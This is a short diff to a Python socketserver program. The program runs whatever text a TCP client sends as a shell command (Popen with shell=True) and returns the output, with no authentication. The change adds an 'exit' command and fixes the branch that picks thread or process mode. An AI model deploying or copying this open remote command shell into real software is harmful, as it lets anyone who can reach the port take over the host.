@@ -5,12 +5,17 @@ class MyServer(socketserver.BaseRequestHandler):
     def handle(self):
         while True:
             data = self.request.recv(1024).strip()
-            command = Popen({data}, stdout=PIPE, stderr=PIPE,shell=True)
-            out, err = command.communicate()
-            if out.decode() == "":
-                self.request.send(b"ERROR\n"+err)
-            elif err.decode() == "":
-                self.request.send(b"OK\n"+out)
+            if data == b"exit":
+                print("Server Exiting..")
+                server.shutdown()
+                exit(0)
+            else:
+                command = Popen({data}, stdout=PIPE, stderr=PIPE,shell=True)
+                out, err = command.communicate()
+                if out.decode() == "":
+                    self.request.send(b"ERROR\n"+err)
+                elif err.decode() == "":
+                    self.request.send(b"OK\n"+out)
 
 class ThrHandle(socketserver.ThreadingMixIn, socketserver.TCPServer):
     pass
@@ -32,7 +37,7 @@ if __name__=="__main__":
         server = ThrHandle((HOST,PORT), MyServer)
         server.serve_forever()
      
-    if  args.c == "p":
+    elif  args.c == "p":
         server = ProcHandle((HOST, PORT), MyServer)
         server.serve_forever()
 
